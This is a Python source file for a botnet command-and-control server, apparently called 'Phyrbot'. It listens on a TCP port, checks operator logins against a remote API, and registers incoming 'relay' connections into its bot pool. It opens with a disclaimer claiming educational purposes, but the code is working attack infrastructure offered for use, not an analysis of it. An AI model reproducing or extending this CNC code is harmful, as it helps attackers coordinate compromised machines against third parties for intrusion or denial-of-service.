#!/usr/bin/python3

from sys import argv, exit
import time
from typing import Any
from threading import Thread
from socket import socket as Sock
from socket import SOL_SOCKET, SO_KEEPALIVE, SO_REUSEADDR
import hashlib
from requests import (
    get as rget,
    Response,
)
from colorama import Fore, init as colorama_init
from modules.config import C2Config, Relay
from modules.core import Core
from modules.client import Client

__filename__ = "cnc"
__legit__ = "I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."

config: C2Config = C2Config(True)
core: Core = Core(config=config)
config.setbanner("""
            dMMMMb     dMP dMP    dMP dMP     dMMMMb    .aMMMb  dMMMMMMP
           dMP.dMP    dMP dMP    dMP.dMP     dMP"dMP   dMP"dMP    dMP
          dMMMMP"    dMMMMMP     VMMMMP     dMMMMK"   dMP dMP    dMP
         dMP        dMP dMP    dA .dMP     dMP.aMF   dMP.aMP    dMP
        dWP        dEP dAP     VREAP"     dNONYP"    VMOUP"    dSP

                    C                N                C
""")

def find_login(
    username: str,
    password: str,
) -> bool:
    password: str = hashlib.sha256(password.encode()).hexdigest()

    url: str = f"{config.API_URL}/login?urlkey={config.URL_KEY}&username={username}&password={password}"
    core.log(f"\n\n{url}\n\n\n\n")

    res: Response = rget(url, timeout=5000)

    return res.status_code == 200

def handle_client(
    client: Sock,
    address: tuple[str, int],
    loops: Core,
) -> None:
    # trying to get username
    while 1:
        loops.send(client, config.ANSI_CLEAR, False)
        loops.send(client, f'{config.COLOR_WHITE}Username > ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # sending password request to client
    password = ''
    while 1:
        loops.send(client, config.ANSI_CLEAR, False)
        loops.send(client, f'{config.COLOR_WHITE}Password > {Fore.BLACK} ', False, False)

        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()

        break

    # if this is a client and not a relay
    if password != config.RELAY_KEY:
        loops.send(client, config.ANSI_CLEAR, False)

        if not find_login(username, password):
            loops.send(client, 'Invalid credentials!')
            time.sleep(1)
            client.close()
            return

        client_loops: Client = Client(core=core, config=config)

        Thread(target=client_loops.update_title, args=[client, username]).start()
        Thread(target=client_loops.command_line, args=[client, username]).start()

    # here, a new relay try to connect
    else:
        for addr in config.relays_sock.values():
            if addr[0] == address[0]: # so same ips
                client.close()
                return

        # new relay here
        relay: Relay = Relay.new(address[0])
        print(client, address, relay)

        # try to insert the relay in database, if not working, don't accept it
        if not loops.edit_relay(relay, "insert"):
            client.close()
            return
        
        config.relays.append(relay)
        config.relays_sock.update({client: address})

def main() -> None:
    port: int = None

    if len(argv) != 2:
        if config.cnc_addr.CNC_PORT != None : port = config.cnc_addr.CNC_PORT
        else:
            core.log(f'Usage: py {argv[0]} <cnc port>')
            exit()

    port = int(argv[1])
    if port < 1 or port > 65535:
        core.log('invalid cnc port')
        exit()

    colorama_init(convert=True)

    s: Sock = Sock()
    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    try: s.bind(('0.0.0.0', port))

    except Exception:
        core.log('Failed to bind port')
        exit()

    if  (status:=rget(f"{config.API_URL}/version?urlkey={config.URL_KEY}").status_code) == 200: pass
    else:
        core.log(f'Failed to connect to api (status={status})')
        exit()

    s.listen()

    Thread(target=core.ping).start()
    Thread(target=core.net).start()
    Thread(target=core.getbot).start()

    while 1: Thread(target=handle_client, args=[*s.accept(), core]).start()

if __name__ == '__main__':
    print(f"\nLegit: {__legit__}\n")
    main()
